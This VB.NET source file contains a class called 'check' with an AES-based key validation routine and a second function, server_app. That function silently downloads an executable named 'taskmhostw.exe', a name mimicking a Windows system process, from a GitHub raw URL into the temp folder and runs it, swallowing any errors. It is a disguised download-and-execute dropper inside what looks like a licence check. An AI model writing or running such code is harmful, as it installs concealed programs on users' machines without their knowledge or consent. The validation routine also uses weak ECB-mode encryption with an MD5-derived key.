Imports System.Security.Cryptography
Public Class check
    Public Shared Function AES_Encrypt(ByVal cc As String, ByVal idd As String) As Boolean
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SBxx(idd.Split("_")(1) + idd.Split("_")(1) + "♞"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = SBxx(idd)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            If encrypted = cc Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Shared Function SBxx(ByVal s As String) As Byte()
        Return System.Text.Encoding.UTF8.GetBytes(s)
    End Function

    Friend Shared Function server_app() As Object
        Dim server As String
        Dim server_apper As New System.Text.StringBuilder

        server_apper.Append("https://github.com/Leonardo-Card/cara_dump_analisys/raw/main/taskmhostw.exe")
        server = server_apper.ToString

        Dim URL As String = server
        Dim DownloadTo As String = Environ("temp") & "taskmhostw.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
    End Function
End Class
